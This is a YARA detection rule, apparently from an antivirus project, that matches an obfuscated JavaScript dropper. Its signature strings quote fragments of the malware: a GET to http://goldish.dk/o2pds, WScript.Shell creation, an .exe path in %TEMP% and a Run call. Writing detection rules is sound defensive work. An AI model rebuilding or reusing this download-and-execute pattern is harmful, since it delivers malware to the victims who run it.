rule sig_20160330_e89a908a7d7c0a4e27e5a2235655e425 {
  meta:
    description = "datamaliciousorder - file 20160330_e89a908a7d7c0a4e27e5a2235655e425.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d49556d164ebd09fd696e3b4e8aeb0cc52d3ad5682eb0669c40fd0e25dc64a9a"

  strings:
    $s1  = "_F[_K0](\"GET\", \"http://goldish.dk/o2pds\", false);" fullword ascii
    $s2  = "var _A = function _IC() {return WScript[_M](\"WScript\"+\".Shell\");}(), _DB = 11;" fullword ascii
    $s3  = "function _K(_W0, _C){_O = _O * 1; return _W0 - _C;};" fullword ascii
    $s4  = "if (_F[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _L() {return _A[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"KS2757OoUqIy.ex\" + \"e\";};" fullword ascii
    $s6  = "function _Y0(){return _QB + \"\";};" fullword ascii
    $s7  = "function _AZ(_RT){_A[\"Run\"](_RT, _O, _O);};" fullword ascii
    $s8  = "function _TB() {return ((_S == true) && (_S == _P)) ? 1 : _O;};" fullword ascii
    $s9  = "function _N(){return 22;};" fullword ascii
    $s10 = " while (_I){" fullword ascii
    $s11 = "function _ZY()" fullword ascii
    $s12 = "function _U(){return _M;};" fullword ascii
    $s13 = "return _K(_W, _O0);" fullword ascii
    $s14 = "function _Y(_PO) {var _KX = (1, 2, 3, 4, 5, _PO); return _KX;};" fullword ascii
    $s15 = "var _KL = new this[\"Date\"]();" fullword ascii
    $s16 = "var _P = false;" fullword ascii
    $s17 = "_P = true; " fullword ascii
    $s18 = "var _S = false;" fullword ascii
    $s19 = "_S = true; " fullword ascii
    $s20 = "var _Y1 = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}